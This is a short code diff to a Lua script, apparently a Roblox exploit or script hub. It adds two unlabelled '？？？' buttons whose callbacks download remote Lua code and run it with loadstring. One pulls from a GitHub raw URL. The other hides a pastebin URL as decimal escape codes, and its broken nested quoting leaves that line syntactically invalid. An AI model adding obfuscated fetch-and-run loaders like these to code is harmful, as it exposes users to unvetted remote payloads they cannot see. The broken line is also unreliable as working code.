@@ -666,6 +666,20 @@ local Section = other:AddSection({
 	Name = "↓开始↓"
 })
 
+other:AddButton({
+	Name = "？？？",
+	Callback = function()
+      	loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/UWU/main/XiaoyunscriptV1.0.2.lua"))()
+  	end
+})
+
+other:AddButton({
+	Name = "？？？2",
+	Callback = function()
+      	loadstring(game:HttpGet("loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()"))()
+  	end
+})
+
 other:AddParagraph("提示","添加什么")
 
 local other = Window:MakeTab({
